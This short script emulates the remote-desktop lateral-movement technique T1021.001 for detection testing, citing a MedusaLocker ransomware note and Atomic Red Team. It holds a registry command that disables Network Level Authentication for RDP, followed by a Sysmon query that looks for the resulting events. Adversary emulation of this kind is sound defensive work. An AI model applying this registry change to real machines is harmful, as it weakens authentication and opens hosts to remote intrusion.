# This code emulates a benign attack with T1021 :Remote Services: Remote Desktop Protocol. And the tatic: Lateral Movement. 
# The type of attack code was found in: https://www.hhs.gov/sites/default/files/medusalocker-ransomware-analyst-note.pdf
# The script to emulate attack was found in: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md

#Emulating attack
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f

# Sysmon detection. Should run the script seperately on Powershell.
Get-WinEvent *Sysmon* | where message -like *T1021* | select -first 1 | Format-List